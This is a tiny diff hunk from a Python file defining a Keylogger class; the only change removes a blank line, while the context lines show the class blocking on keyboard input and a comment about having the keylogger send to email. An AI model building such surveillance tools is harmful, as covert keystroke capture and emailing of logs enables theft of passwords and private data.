@@ -129,7 +129,6 @@ class Keylogger:
         self.report()
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-
     
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
